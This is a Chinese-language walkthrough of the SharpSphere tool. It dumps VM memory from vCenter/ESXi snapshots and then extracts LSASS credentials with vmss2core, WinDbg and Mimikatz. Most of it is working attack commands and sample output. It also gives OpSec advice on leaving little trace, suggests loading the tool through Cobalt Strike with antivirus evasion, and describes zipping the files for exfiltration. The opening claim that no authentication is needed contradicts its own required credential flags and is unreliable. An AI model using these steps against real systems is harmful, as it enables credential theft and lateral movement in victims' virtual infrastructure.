[SharpSphere](https://github.com/JamesCooteUK/SharpSphere)可以从vCenter或ESXi运营商中
dump LSASS内存数据，而无需身份验证来,并且无需安装VMware Tools。

这项技术不是新技术，已经存在了很多年：

> https://danielsauder.com/2016/02/06/memdumps-volatility-mimikatz-vms-> part-6-vmware-workstation/
>
>
> https://web.archive.org/web/20210204072538/https://www.remkoweijnen.nl/blog/2013/11/25/dumping-> passwords-in-a-vmware-vmem-file/

但是到现在为止，在实际操作上很难发挥作用，主要原因是：

> 1.需要验证vCenter/ESXi
>
> 2.为目标VM创建带有内存的的快照
>
> 3.需要将数据下载到本地，（通常非常大）`.vmem`和`.vmsn`文件
>
> 4.通过Volatility来运行
>
> 5.使用vmss2core转换为`.dmp`并通过Mimikatz 和 WinDbg运行

## 参数

    
    
    Z:\>SharpSphere.exe dump --help
    SharpSphere 1.0.0.0
    Copyright ©  2020
    
      --url            Required. vCenter SDK URL, i.e. https://127.0.0.1/sdk
    
      --username       Required. vCenter username, i.e. administrator@vsphere.local
    
      --password       Required. vCenter password
    
      --targetvm       Required. VM to snapshot
    
      --snapshot       (Default: false) WARNING: Creates and then deletes a snapshot. If unset, SharpSphere will only
                       extract memory from last existing snapshot, or none if no snapshots are available.
    
      --destination    Required. Full path to the local directory where the file should be downloaded
    
      --help           Display this help screen.
    
      --version        Display version information.
    

### –snapshot

默认情况下，SharpSphere不会试图创建一个快照，而会试图从现有的快照找到有效`.vmem`和`.vmsn`文件。从OpSec的角度来看，这是可取的，因为UI中没有证据，但是不能保证目标上有快照，而且这些快照有没有捕获了VM的内存也是问题。所以如果现有快照不存在，SharpSphere将退出。

所以`--snapshot`参数规定，SharpSphere会创建一个名为`System Backup
[TIMESTAMP]`的快照，下载相关联的“`.vmem`和`.vmsn`文件，然后删除快照一旦完成。`Recent
Tasks`窗口中的其他用户将同时看到快照的创建和删除。

![快照活动](https://image.3001.net/images/20210226/1614351056_60390ad0e4f56514eef4b.png!small)

当然`--snapshot`可以先查看是否存在现有快照

### -destination

SharpSphere需要从快照下载两个文件，一个大小等于分配给该机器的RAM的（即4GB，8GB，16GB等）的`.vmem`文件，以及一个小得多的`.vmsn`文件。它将这些文件下载到`--destination`指定的目录中。但下载完这两个文件，SharpSphere会将它们都添加到具有随机名称的zip文件中，然后将其删除。

## 介绍

1.使用以下参数执行SharpSphere（提示：使用获取虚拟机名称list）：

    
    
    SharpSphere.exe dump --url https://[IP or FQDN]/sdk --username [USERNAME] --password [PASSWORD] --targetvm [NAME OF VM] --destination [LOCATION TO DOWNLOAD FILES]
    

示例输出

    
    
    C:\Users\Administrator\Desktop>SharpSphere.exe dump --url https://vcenter.globex.com/sdk --username administrator@vsphere.local --password Password1! --targetvm "Windows 10" --destination "C:\Users\Public"
     [x] Disabling SSL checks in case vCenter is using untrusted/self-signed certificates
     [x] Creating vSphere API interface, takes a few minutes...
     [x] Connected to VMware vCenter Server 7.0.1 build-17005016
     [x] Successfully authenticated
     [x] Finding existing snapshots for Windows 10...
     Error: No existing snapshots found for the VM Windows 10, recommend you try again with --snapshot set
    

2.如果不存在快照，添加一个参数`--snapshot`

    
    
    SharpSphere.exe dump --url https://vcenter.globex.com/sdk --username administrator@vsphere.local --password Password1! --targetvm "Windows 10" --destination "C:\Users\Public" --snapshot
     [x] Disabling SSL checks in case vCenter is using untrusted/self-signed certificates
     [x] Creating vSphere API interface, takes a few minutes...
     [x] Connected to VMware vCenter Server 7.0.1 build-17005016
     [x] Successfully authenticated
     [x] Creating snapshot for VM Windows 10...
     [x] Snapshot created successfully
     [x] Downloading Windows 10-Snapshot51.vmem (4096MB) to C:\Users\Public\z53dqmxx.5bz...
     [x] Downloading Windows 10-Snapshot51.vmsn to C:\Users\Public\hwu5gv2d.ezv...
     [x] Download complete, zipping up so it's easier to exfiltrate...
     [x] Zipping complete, download C:\Users\Public\cec0kwgk.b2m (916MB), rename to .zip, and follow instructions to use with Mimikatz
     [x] Deleting the snapshot we created
    

3.如果你使用cs之类的工具，可以直接在目标机器上加载远程加载程序。或者，将工具上传到目标机上，但要做好免杀处理。

4.在这种情况下`cec0kwgk.b2m`，将随机重命名为zip文件，然后解压缩这两个文件。较大的是您的`.vmem`文件。

5.下载[vmss2core](https://flings.vmware.com/vmss2core)并先提供较小的`.vmsn`文件，然后再提供较大的`.vmem`文件。如果目标VM是Microsoft
Windows 8 / 8.1，Windows Server 2012，Windows Server 2016或Windows Server
2019，则执行以下命令`-W8`：

    
    
    vmss2core-sb-8456865.exe -W8 hwu5gv2d.ezv z53dqmxx.5bz
    

否则使用`-W`：

    
    
    vmss2core-sb-8456865.exe -W hwu5gv2d.ezv z53dqmxx.5bz
    

6.下载[WinDbg](http://download.microsoft.com/download/A/6/A/A6AC035D-DA3F-4F0C-ADA4-37C8E5D34E3D/setup/WinSDKDebuggingTools_amd64/dbg_amd64.msi)并加载`.dmp`文件。`vmss2core
Crash Dump`

7.下载Mimikatz并使用WinDbg加载Mimilib.dll

    
    
    .load C:\Tools\Mimikatz\x64\mimilib.dll
    

8.查找LSASS 进程

    
    
    !process 0 0 lsass.exe
    

9.切换进程

    
    
    .process /r /p ffffc70462d020c0
    

10.获取凭证

    
    
    !mimikatz﻿

